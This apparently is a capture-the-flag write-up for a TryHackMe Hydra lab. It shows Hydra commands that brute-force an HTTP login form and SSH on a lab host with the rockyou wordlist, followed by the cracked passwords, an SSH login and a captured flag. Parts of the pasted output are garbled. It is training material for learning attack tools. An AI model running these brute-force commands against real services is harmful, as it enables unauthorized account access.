## Objetivo 
Learn about and use Hydra, a fast network logon cracker, to bruteforce and obtain a website's credentials.

## Solución 
hani06@DESKTOP-4NE4RTQ:~$ hydra -l molly -P rockyou.txt 10.10.27.62 http-post-form "/login:username="USER^&password=^PASS^: incorrect" lydra v8.8 (c) 2019 by van Hauser/THC Please do not use in military or secret service organizations, or for illegal purposes.
lydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-19 02:35:35
WARNING] Restorefile (you have 10 seconds to abort... (use option I to skip waiting)) from a previous session found, to prevent overwritin 1. ./hydra. restore
DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (1:1/p:14344398), -896525 tries per task
DATA] attacking http-post-form://10.10.27.62:80/login: username="USER &password="PASS^: incorrect
80][http-post-form] host: 10.10.27.62 login: molly password: sunshine
STATUS] attack finished for 10.10.27.62 (valid pair found)
of 1 target successfully completed, 1 valid password found


![[Pasted image 20241019145842.png]]
![[Pasted image 20241019145825.png]]

hani06@DESKTOP-4NE4RTQ:~$ hydra -l molly P rockyou.txt 10.10.27.62 ssh
Hydra v8.8 (c) 2019 by van Hauser/THC Please do not use in military or secret service orga
-
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-19 02:40:40 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to r [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (1:1/p: 14344398), [DATA] attacking ssh://10.10.27.62/
[22][ssh] host: 10.10.27.62 login: molly password: butterfly
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end. [

hani06@DESKTOP-4NE4RTQ:~$ ssh molly@10.10.27.62 nolly@10.10.27.62's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-1092-aws x86_6
* Documentation:
* Management:
* Support:
https://help.ubuntu.com
https://landscape.canonical.com https://ubuntu.com/advantage
55 packages can be updated.
32 updates are security updates.

molly@ip-10.10.27.62:~$ ls
flag2.txt
molly@ip-10.10.27.62:~$ cat flag2.txt THM{c8eeb0468 febbadea859baeb33b2541b}
## Notas
